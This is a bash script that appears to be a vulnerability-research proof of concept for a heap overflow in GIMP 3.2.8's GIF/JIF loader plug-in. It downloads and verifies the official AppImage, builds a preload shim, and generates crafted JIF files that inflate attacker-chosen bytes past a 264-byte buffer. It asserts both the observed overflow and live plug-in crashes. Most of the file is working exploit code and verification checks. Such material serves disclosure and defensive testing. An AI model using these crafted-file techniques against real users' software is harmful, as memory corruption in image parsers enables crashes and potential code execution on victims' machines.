#!/usr/bin/env bash
# Large natural JIF overflow through the real GIMP 3.2.8 plugin.
#
# The pinned avail_out is the unwrapped len*height (~2 GiB) while the
# inflated payload is attacker-chosen by the JIF. Prior lanes used 324 or
# 448 output bytes. Here a 1 KiB / 8 KiB / 64 KiB run of chosen 0x4d is
# inflated by the real zlib into the real 264-byte `indexes` allocation.
# No plugin source, heap word or allocator state is modified. A read-only
# shim observes the 1 KiB case; the crashing cases run with NO shim at all.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
BASE="$(cd "$HERE/.." && pwd)"
WORK="${GIMPJIF_APPIMAGE_WORK:-/tmp/gimpjif-appimage}"
IMG="$WORK/GIMP-3.2.8-x86_64.AppImage"
ROOT="$WORK/squashfs-root"
EVID="$HERE/evidence"
PASS=0
FAIL=0

ok () { echo "PASS: $1"; PASS=$((PASS + 1)); }
no () { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

mkdir -p "$WORK" "$EVID"
if [ ! -f "$IMG" ]; then
  curl -fsSL --max-time 240 -o "$IMG" \
    https://download.gimp.org/gimp/v3.2/linux/GIMP-3.2.8-x86_64.AppImage
fi
if [ ! -f "$WORK/SHA256SUMS" ]; then
  curl -fsSL --max-time 30 -o "$WORK/SHA256SUMS" \
    https://download.gimp.org/gimp/v3.2/linux/SHA256SUMS
fi
(cd "$WORK" && grep 'GIMP-3.2.8-x86_64.AppImage' SHA256SUMS | sha256sum -c -)
ok "official AppImage SHA256 verified"

if [ ! -x "$ROOT/AppRun" ]; then
  chmod +x "$IMG"
  (cd "$WORK" && ./GIMP-3.2.8-x86_64.AppImage --appimage-extract >/dev/null)
fi
"$ROOT/AppRun" --version | grep -q '3.2.8'
ok "extracted runtime reports GIMP 3.2.8"

gcc -shared -fPIC -O2 -o "$HERE/span-shim.so" "$HERE/span-shim.c" -ldl
ok "read-only span observation shim built"

python3 "$BASE/realglib/make-jif.py" "$EVID/span-1024.jif" published-run 1024 4d > /dev/null
python3 "$BASE/realglib/make-jif.py" "$EVID/span-8192.jif" published-run 8192 4d > /dev/null
python3 "$BASE/realglib/make-jif.py" "$EVID/span-65536.jif" published-run 65536 4d > /dev/null
ok "three large-inflation JIFs written"

# Generate two AppRun variants from whatever preload line is currently in
# the extracted AppRun. Both variants live outside Git and are regenerated
# on every replay, so earlier probes' shim lines cannot leak into a control.
for variant in span noshim; do
  target="$ROOT/AppRun.$variant"
  inserted=0
  : > "$target"
  while IFS= read -r line || [ -n "$line" ]; do
    case "$line" in
      *gimpjif2shell/live/*shim.so*) continue ;;
      exec*org.gimp.GIMP.Stable*)
        if [ "$variant" = span ] && [ "$inserted" -eq 0 ]; then
          printf 'export LD_PRELOAD="$LD_PRELOAD:%s"\n' "$HERE/span-shim.so" >> "$target"
          inserted=1
        fi
        ;;
    esac
    printf '%s\n' "$line" >> "$target"
  done < "$ROOT/AppRun"
  if [ "$variant" = span ]; then
    [ "$inserted" -eq 1 ] || { echo "AppRun exec line not found" >&2; exit 1; }
  fi
  chmod +x "$target"
done
ok "span and no-shim AppRun variants generated"

run_jif () {
  local variant="$1" file="$2" out="$3"
  local home; home="$(mktemp -d /tmp/gimpjif-span-home-XXXXXX)"
  (cd "$ROOT" && timeout -k 5 90 env HOME="$home" "./AppRun.$variant" -i \
      --batch-interpreter plug-in-script-fu-eval \
      -b "(let* ((img (car (gimp-file-load RUN-NONINTERACTIVE \"$file\" \"$(basename "$file")\")))) (gimp-message (number->string (car (gimp-image-get-width img)))))" \
      -b '(gimp-quit 0)') > "$out" 2>&1 || true
  ps -u "$(id -u)" -o pid,args | grep -F "$ROOT" | grep 'org.gimp.GIMP.Stable -i' \
    | grep -v grep | awk '{print $1}' | xargs -r kill -9 || true
}

SAFE="$BASE/realglib/evidence/safe.jif"
run_jif span "$SAFE" "$EVID/span-safe.log"
run_jif span "$EVID/span-1024.jif" "$EVID/span-1024.log"
run_jif noshim "$SAFE" "$EVID/noshim-safe.log"
run_jif noshim "$EVID/span-8192.jif" "$EVID/noshim-8192.log"
run_jif noshim "$EVID/span-65536.jif" "$EVID/noshim-65536.log"

grep -q 'batch command executed successfully' "$EVID/span-safe.log" \
  && ok "safe 4x4 JIF loads with observation shim" || no "safe load with shim"
! grep -q '^SPAN_' "$EVID/span-safe.log" \
  && ok "safe load makes no wrapped inflate call" || no "safe span control"

grep -q 'avail_out_before=2147483778 total_out=1024 ret=1' "$EVID/span-1024.log" \
  && ok "real zlib inflates 1024 chosen bytes into 264-byte indexes" || no "1024-byte inflate"
grep -q 'SPAN_RUN usable=264 chosen_run_after_usable=760' "$EVID/span-1024.log" \
  && ok "760 chosen bytes observed past the allocation" || no "chosen run past indexes"

grep -q 'batch command executed successfully' "$EVID/noshim-safe.log" \
  && ok "safe 4x4 JIF loads with NO shim" || no "safe load without shim"
# The exact fault site is layout-sensitive: one unshimmed run reached
# glibc's tcache alignment check, another faulted inside the plug-in after
# inflate reported an error. Both are natural consequences of the same
# file-chosen overflow; assert only that the live plug-in faults.
grep -Eq 'malloc\(\): unaligned tcache chunk detected|fatal error: Segmentation fault|Plug-in crashed: "file-gif-load"' "$EVID/noshim-8192.log" \
  && ok "8 KiB natural overflow faults the live plug-in" || no "8 KiB live fault"
grep -q 'Plug-in crashed: "file-gif-load"' "$EVID/noshim-65536.log" \
  && ok "64 KiB JIF crashes the real file-gif-load plug-in" || no "64 KiB plug-in crash"

echo "TOTAL: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
